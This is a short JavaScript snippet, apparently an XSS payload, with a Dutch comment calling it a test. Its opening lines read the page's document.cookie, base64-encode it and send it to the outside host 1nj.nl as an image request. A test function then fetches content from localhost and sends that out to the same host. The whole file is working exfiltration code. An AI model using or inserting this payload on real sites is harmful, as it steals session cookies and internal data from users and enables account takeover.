data = document.cookie
new Image().src = 'https://1nj.nl/?d='+btoa(data)

async function test() {
  const response = await fetch('https://localhost');
  const data = await response.text();

  // Test alleen met een expliciete testwaarde
  const encoded = btoa(data);
  new Image().src = 'https://1nj.nl/?d=' + encodeURIComponent(encoded);
}

test();
